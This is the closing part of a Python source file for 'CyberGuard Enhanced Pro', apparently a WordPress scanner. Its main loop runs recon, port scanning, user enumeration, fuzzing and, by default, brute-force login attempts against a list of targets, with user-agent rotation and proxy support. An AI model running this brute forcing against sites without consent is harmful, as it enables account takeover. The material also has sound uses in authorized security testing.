        # Plugin-specific recommendations
        if any('plugin' in v.name.lower() for v in vulnerabilities):
            recommendations.append("Update or remove vulnerable plugins immediately")
            recommendations.append("Only install plugins from trusted sources")
            recommendations.append("Regularly audit installed plugins")
        
        return recommendations

class CyberGuardEnhanced:
    def __init__(self):
        self.ua_manager = AdvancedUserAgentManager()
        self.network_recon = NetworkRecon()
        self.wordpress_scanner = AdvancedWordPress(self.ua_manager)
        self.user_enumerator = AdvancedUserEnum(self.ua_manager)
        self.wordlist_generator = AdvancedWordlistGenerator()
        self.brute_forcer = AdvancedBruteForcer(self.ua_manager)
        self.vulnerability_scanner = AdvancedVulnerabilityScanner(self.ua_manager)
        self.fuzzer = AdvancedFuzzer(self.ua_manager)
        self.report_generator = AdvancedReportGenerator()
        self.scan_start_time = None
        
    async def comprehensive_scan(self, targets: List[str], options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Run comprehensive security scan"""
        
        if options is None:
            options = {}
        
        self.scan_start_time = datetime.now()
        logger.info(f"Starting comprehensive scan on {len(targets)} targets")
        
        all_results = {
            'targets': [],
            'summary': {
                'total_targets': len(targets),
                'successful_scans': 0,
                'total_vulnerabilities': 0,
                'total_successful_logins': 0,
                'scan_duration': None
            }
        }
        
        for target in targets:
            try:
                logger.info(f"Scanning target: {target}")
                target_result = await self._scan_single_target(target, options)
                all_results['targets'].append(target_result)
                
                if target_result['success']:
                    all_results['summary']['successful_scans'] += 1
                    all_results['summary']['total_vulnerabilities'] += len(target_result.get('vulnerabilities', []))
                    all_results['summary']['total_successful_logins'] += len(target_result.get('successful_logins', []))
                
            except Exception as e:
                logger.error(f"Scan failed for {target}: {e}")
                all_results['targets'].append({
                    'url': target,
                    'success': False,
                    'error': str(e),
                    'vulnerabilities': [],
                    'successful_logins': [],
                    'fuzzing_results': []
                })
        
        # Calculate scan duration
        scan_duration = datetime.now() - self.scan_start_time
        all_results['summary']['scan_duration'] = str(scan_duration)
        
        logger.success(f"Comprehensive scan completed in {scan_duration}")
        logger.info(f"Results: {all_results['summary']['successful_scans']}/{all_results['summary']['total_targets']} successful scans")
        logger.info(f"Total vulnerabilities: {all_results['summary']['total_vulnerabilities']}")
        logger.info(f"Total successful logins: {all_results['summary']['total_successful_logins']}")
        
        return all_results
    
    async def _scan_single_target(self, url: str, options: Dict[str, Any]) -> Dict[str, Any]:
        """Scan a single target comprehensively"""
        
        # Normalize URL
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        scan_result = {
            'url': url,
            'success': False,
            'scan_start': datetime.now().isoformat(),
            'wordpress_info': {},
            'network_info': {},
            'users': [],
            'vulnerabilities': [],
            'successful_logins': [],
            'fuzzing_results': [],
            'scan_modules': {
                'network_recon': False,
                'wordpress_detection': False,
                'user_enumeration': False,
                'vulnerability_scan': False,
                'brute_force': False,
                'fuzzing': False
            }
        }
        
        try:
            # Phase 1: Network Reconnaissance
            if options.get('network_recon', True):
                logger.info("Phase 1: Network reconnaissance", "SCAN")
                try:
                    # DNS resolution
                    dns_info = await self.network_recon.resolve_domain(url)
                    scan_result['network_info']['dns'] = dns_info
                    
                    # WHOIS lookup
                    whois_info = self.network_recon.get_whois_info(url)
                    scan_result['network_info']['whois'] = whois_info
                    
                    # Port scanning
                    open_ports = self.network_recon.port_scan(url, CONFIG['default_ports'])
                    scan_result['network_info']['open_ports'] = open_ports
                    
                    # SSL analysis
                    if 443 in open_ports:
                        ssl_info = self.network_recon.get_ssl_info(url, 443)
                        scan_result['network_info']['ssl'] = ssl_info
                    
                    scan_result['scan_modules']['network_recon'] = True
                    logger.success("Network reconnaissance completed")
                    
                except Exception as e:
                    logger.error(f"Network reconnaissance failed: {e}")
            
            # Phase 2: WordPress Detection
            logger.info("Phase 2: WordPress detection and analysis", "SCAN")
            try:
                wp_info = await self.wordpress_scanner.advanced_wordpress_detection(url)
                scan_result['wordpress_info'] = wp_info
                scan_result['scan_modules']['wordpress_detection'] = True
                
                if wp_info.get('is_wordpress'):
                    logger.success("WordPress detected - continuing with WP-specific scans")
                else:
                    logger.warning("Not a WordPress site - limited scanning available")
                    
            except Exception as e:
                logger.error(f"WordPress detection failed: {e}")
            
            # Phase 3: User Enumeration
            if options.get('user_enum', True) and scan_result['wordpress_info'].get('is_wordpress'):
                logger.info("Phase 3: User enumeration", "SCAN")
                try:
                    users = await self.user_enumerator.comprehensive_user_enumeration(url)
                    scan_result['users'] = users
                    scan_result['scan_modules']['user_enumeration'] = True
                    logger.success(f"Found {len(users)} users")
                except Exception as e:
                    logger.error(f"User enumeration failed: {e}")
            
            # Phase 4: Vulnerability Scanning
            if options.get('vuln_scan', True):
                logger.info("Phase 4: Vulnerability scanning", "SCAN")
                try:
                    temp_report = Path(CONFIG['temp_dir']) / f"temp_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    temp_report.parent.mkdir(exist_ok=True)
                    
                    vulnerabilities = await self.vulnerability_scanner.comprehensive_vulnerability_scan(
                        url, scan_result['wordpress_info'], str(temp_report)
                    )
                    scan_result['vulnerabilities'] = vulnerabilities
                    scan_result['scan_modules']['vulnerability_scan'] = True
                    logger.success(f"Found {len(vulnerabilities)} vulnerabilities")
                    
                    # Clean up temp file
                    if temp_report.exists():
                        temp_report.unlink()
                        
                except Exception as e:
                    logger.error(f"Vulnerability scanning failed: {e}")
            
            # Phase 5: Brute Force Attack
            if options.get('brute_force', True) and scan_result['users'] and scan_result['wordpress_info'].get('is_wordpress'):
                logger.info("Phase 5: Intelligent brute force attack", "SCAN")
                try:
                    # Generate smart wordlist
                    html_content = ""  # Could be extracted from wordpress detection
                    passwords = self.wordlist_generator.generate_smart_wordlist(
                        url, html_content, scan_result['users'], scan_result['wordpress_info']
                    )
                    
                    # Perform brute force
                    temp_report = Path(CONFIG['temp_dir']) / f"temp_bf_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    successful_logins = await self.brute_forcer.intelligent_brute_force(
                        url, scan_result['users'], passwords, str(temp_report)
                    )
                    scan_result['successful_logins'] = successful_logins
                    scan_result['scan_modules']['brute_force'] = True
                    
                    if successful_logins:
                        logger.critical(f"CRITICAL: Found {len(successful_logins)} valid credentials!")
                    else:
                        logger.info("No valid credentials found")
                    
                    # Clean up temp file
                    if temp_report.exists():
                        temp_report.unlink()
                        
                except Exception as e:
                    logger.error(f"Brute force attack failed: {e}")
            
            # Phase 6: Advanced Fuzzing
            if options.get('fuzzing', True):
                logger.info("Phase 6: Advanced fuzzing for zero-days", "SCAN")
                try:
                    temp_report = Path(CONFIG['temp_dir']) / f"temp_fuzz_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    fuzzing_results = await self.fuzzer.intelligent_fuzzing(url, str(temp_report))
                    scan_result['fuzzing_results'] = fuzzing_results
                    scan_result['scan_modules']['fuzzing'] = True
                    logger.success(f"Fuzzing completed: {len(fuzzing_results)} anomalies found")
                    
                    # Clean up temp file
                    if temp_report.exists():
                        temp_report.unlink()
                        
                except Exception as e:
                    logger.error(f"Fuzzing failed: {e}")
            
            # Mark scan as successful if we got this far
            scan_result['success'] = True
            scan_result['scan_end'] = datetime.now().isoformat()
            
            # Calculate scan duration for this target
            start_time = datetime.fromisoformat(scan_result['scan_start'])
            end_time = datetime.fromisoformat(scan_result['scan_end'])
            scan_result['scan_duration'] = str(end_time - start_time)
            
            logger.success(f"Target scan completed: {url}")
            
        except Exception as e:
            logger.error(f"Target scan failed for {url}: {e}")
            scan_result['error'] = str(e)
            scan_result['scan_end'] = datetime.now().isoformat()
        
        return scan_result

def setup_environment():
    """Setup necessary directories and files"""
    directories = [
        CONFIG['reports_dir'],
        CONFIG['temp_dir'],
        CONFIG['wordlists_dir']
    ]
    
    for directory in directories:
        Path(directory).mkdir(exist_ok=True)
    
    # Create sample user agents file if not exists
    ua_file = Path(CONFIG['user_agents_file'])
    if not ua_file.exists():
        sample_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36'
        ]
        
        with open(ua_file, 'w') as f:
            for agent in sample_agents:
                f.write(agent + '\n')

def parse_arguments():
    """Parse command line arguments"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='CyberGuard v10.0 Enhanced Pro - Advanced WordPress Security Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python cyberguard_enhanced.py https://example.com
  python cyberguard_enhanced.py targets.txt --no-brute-force
  python cyberguard_enhanced.py https://example.com --threads 10 --wordlist custom.txt
  python cyberguard_enhanced.py https://example.com --fuzzing-only --output-prefix custom_scan
        """
    )
    
    parser.add_argument('target', help='Target URL or file containing target URLs')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--wordlist', '-w', help='Custom wordlist file for brute forcing')
    parser.add_argument('--output-prefix', '-o', default='cyberguard', help='Output file prefix')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests')
    
    # Scan options
    parser.add_argument('--no-network-recon', action='store_true', help='Skip network reconnaissance')
    parser.add_argument('--no-user-enum', action='store_true', help='Skip user enumeration')
    parser.add_argument('--no-vuln-scan', action='store_true', help='Skip vulnerability scanning')
    parser.add_argument('--no-brute-force', action='store_true', help='Skip brute force attacks')
    parser.add_argument('--no-fuzzing', action='store_true', help='Skip fuzzing')
    
    # Specific scans
    parser.add_argument('--fuzzing-only', action='store_true', help='Run only fuzzing scan')
    parser.add_argument('--vuln-only', action='store_true', help='Run only vulnerability scan')
    
    # Advanced options
    parser.add_argument('--shodan-api-key', help='Shodan API key for enhanced reconnaissance')
    parser.add_argument('--wpscan-api-key', help='WPScan API key for vulnerability database')
    parser.add_argument('--user-agent', help='Custom user agent string')
    parser.add_argument('--proxy', help='Proxy server (format: http://host:port)')
    
    return parser.parse_args()

async def main():
    """Main function"""
    # Setup
    setup_environment()
    AdvancedBanner.print_banner()
    
    # Parse arguments
    args = parse_arguments()
    
    # Update configuration
    CONFIG['max_threads'] = args.threads
    CONFIG['request_timeout'] = args.timeout
    CONFIG['delay_range'] = (args.delay, args.delay * 2)
    
    if args.shodan_api_key:
        CONFIG['shodan_api_key'] = args.shodan_api_key
    
    # Load targets
    targets = []
    if Path(args.target).exists():
        # Load from file
        with open(args.target, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        logger.info(f"Loaded {len(targets)} targets from file")
    else:
        # Single target
        targets = [args.target]
    
    if not targets:
        logger.error("No valid targets provided")
        return
    
    # Setup scan options
    scan_options = {
        'network_recon': not args.no_network_recon,
        'user_enum': not args.no_user_enum,
        'vuln_scan': not args.no_vuln_scan,
        'brute_force': not args.no_brute_force,
        'fuzzing': not args.no_fuzzing,
        'wordlist': args.wordlist,
        'wpscan_api_key': args.wpscan_api_key
    }
    
    # Handle specific scan modes
    if args.fuzzing_only:
        scan_options = {key: False for key in scan_options}
        scan_options['fuzzing'] = True
    elif args.vuln_only:
        scan_options = {key: False for key in scan_options}
        scan_options['vuln_scan'] = True
    
    logger.info(f"Scan configuration: {scan_options}")
    
    # Initialize scanner
    scanner = CyberGuardEnhanced()
    
    try:
        # Run comprehensive scan
        results = await scanner.comprehensive_scan(targets, scan_options)
        
        # Generate reports for each target
        for target_result in results['targets']:
            if target_result['success']:
                # Generate individual target reports
                report_files = scanner.report_generator.generate_comprehensive_report(
                    target_result,
                    target_result.get('vulnerabilities', []),
                    target_result.get('fuzzing_results', []),
                    target_result.get('successful_logins', []),
                    f"{args.output_prefix}_{urlparse(target_result['url']).netloc}"
                )
                
                logger.success(f"Reports generated for {target_result['url']}:")
                for format_type, file_path in report_files.items():
                    logger.info(f"  {format_type.upper()}: {file_path}")
        
        # Generate summary report for multiple targets
        if len(targets) > 1:
            summary_files = scanner.report_generator.generate_comprehensive_report(
                results,
                # Combine all vulnerabilities
                [vuln for target in results['targets'] for vuln in target.get('vulnerabilities', [])],
                # Combine all fuzzing results
                [fuzz for target in results['targets'] for fuzz in target.get('fuzzing_results', [])],
                # Combine all successful logins
                [login for target in results['targets'] for login in target.get('successful_logins', [])],
                f"{args.output_prefix}_summary"
            )
            
            logger.success("Summary reports generated:")
            for format_type, file_path in summary_files.items():
                logger.info(f"  {format_type.upper()}: {file_path}")
        
        # Final summary
        logger.success("="*60)
        logger.success("SCAN COMPLETED SUCCESSFULLY!")
        logger.success("="*60)
        logger.info(f"Targets scanned: {results['summary']['total_targets']}")
        logger.info(f"Successful scans: {results['summary']['successful_scans']}")
        logger.info(f"Total vulnerabilities: {results['summary']['total_vulnerabilities']}")
        logger.info(f"Total successful logins: {results['summary']['total_successful_logins']}")
        logger.info(f"Scan duration: {results['summary']['scan_duration']}")
        
        if results['summary']['total_successful_logins'] > 0:
            logger.critical("⚠️  CRITICAL: Valid credentials found! Check reports immediately!")
        
        if results['summary']['total_vulnerabilities'] > 0:
            logger.warning(f"⚠️  {results['summary']['total_vulnerabilities']} vulnerabilities detected!")
        
    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user")
    except Exception as e:
        logger.error(f"Scan failed with error: {e}")
        import traceback
        logger.error(traceback.format_exc())

if __name__ == "__main__":
    try:
        import asyncio
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
